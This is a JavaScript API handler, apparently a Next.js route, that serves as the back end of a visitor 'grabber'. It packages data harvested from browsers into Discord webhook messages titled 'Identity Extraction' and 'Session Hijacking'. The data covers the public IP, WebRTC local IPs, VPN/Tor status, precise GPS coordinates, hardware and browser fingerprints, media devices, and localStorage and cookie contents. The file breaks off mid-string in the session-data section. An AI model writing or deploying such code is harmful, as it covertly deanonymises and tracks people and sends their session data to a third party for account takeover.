export const config = { api: { bodyParser: { sizeLimit: '10mb' } } };

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const WEBHOOK = process.env.DISCORD_WEBHOOK;
  const data = req.body;
  
  // Split into multiple embeds if massive payload
  const createEmbeds = () => {
    const embeds = [];
    
    // Embed 1: Identity & Network
    embeds.push({
      title: "🎯 Identity Extraction",
      color: 0xff0000,
      fields: [
        { name: "Public IP", value: `\`${data.ip}\``, inline: true },
        { name: "ISP/Org", value: data.geo?.org?.substring(0, 25) || 'N/A', inline: true },
        { name: "ASN", value: data.geo?.asn || 'N/A', inline: true },
        { name: "VPN/Proxy?", value: data.geo?.threat ? '⚠️ YES' : '❌ No', inline: true },
        { name: "WebRTC Local IPs", value: data.webrtc?.join(', ')?.substring(0, 100) || 'None', inline: false },
        { name: "Tor Exit?", value: data.geo?.threat?.is_tor ? '🧅 YES' : 'No', inline: true },
        { name: "Datacenter?", value: data.geo?.threat?.is_datacenter ? '🖥️ YES' : 'No', inline: true }
      ]
    });

    // Embed 2: Precise Location
    if (data.preciseGeo) {
      embeds.push({
        title: "📍 Precise GPS (Permission Granted)",
        color: 0x00ff00,
        description: `**Accuracy:** ${data.preciseGeo.accuracy}m\n[Open Maps](https://www.google.com/maps?q=${data.preciseGeo.lat},${data.preciseGeo.lon})`,
        fields: [
          { name: "Latitude", value: `\`${data.preciseGeo.lat}\``, inline: true },
          { name: "Longitude", value: `\`${data.preciseGeo.lon}\``, inline: true }
        ]
      });
    }

    // Embed 3: Hardware & System
    embeds.push({
      title: "💻 System Fingerprint",
      color: 0x0099ff,
      fields: [
        { name: "Platform", value: data.system?.platform, inline: true },
        { name: "Cores", value: `${data.system?.cores}`, inline: true },
        { name: "RAM", value: `${data.system?.ram}GB`, inline: true },
        { name: "Screen", value: `${data.screen?.width}x${data.screen?.height}`, inline: true },
        { name: "Color Depth", value: `${data.screen?.colorDepth}`, inline: true },
        { name: "Touch", value: `${data.screen?.touch}`, inline: true },
        { name: "Language", value: data.system?.language, inline: true },
        { name: "Timezone", value: data.system?.timezone, inline: true },
        { name: "DoNotTrack", value: data.system?.dnt, inline: true }
      ]
    });

    // Embed 4: Browser Fingerprint
    embeds.push({
      title: "🔍 Browser Signature",
      color: 0xff00ff,
      fields: [
        { name: "User Agent", value: `\`\`\`${data.browser?.ua?.substring(0, 1000)}\`\`\`` },
        { name: "Canvas Hash", value: `\`${data.fingerprint?.canvas}\``, inline: true },
        { name: "WebGL Hash", value: `\`${data.fingerprint?.webgl}\``, inline: true },
        { name: "Fonts", value: `${data.fingerprint?.fonts?.length} detected`, inline: true },
        { name: "Plugins", value: data.browser?.plugins?.join(', ')?.substring(0, 500) || 'None' }
      ]
    });

    // Embed 5: Network & Performance
    embeds.push({
      title: "🌐 Network Analysis",
      color: 0xffff00,
      fields: [
        { name: "Connection", value: data.network?.type, inline: true },
        { name: "Downlink", value: `${data.network?.downlink} Mbps`, inline: true },
        { name: "RTT", value: `${data.network?.rtt}ms`, inline: true },
        { name: "Save Data?", value: data.network?.saveData ? 'Yes' : 'No', inline: true },
        { name: "PDF Viewer", value: data.browser?.pdfViewer, inline: true },
        { name: "Referrer", value: data.session?.referrer?.substring(0, 500) || 'Direct' }
      ]
    });

    // Embed 6: Media Devices
    if (data.media?.length) {
      embeds.push({
        title: "📷 Media Hardware",
        color: 0x00ffff,
        fields: data.media.slice(0, 5).map(d => ({
          name: d.label || 'Unnamed Device',
          value: `${d.kind} (${d.groupId?.substring(0, 8)}...)`,
          inline: true
        }))
      });
    }

    // Embed 7: Session Hijacking
    if (data.storage || data.cookies) {
      embeds.push({
        title: "🔑 Session Data",
        color: 0xff6600,
        description: `**LocalStorage Keys:** ${data.storage?.local?.join(', ')?.substring(0, 500) || 'None'}\n*
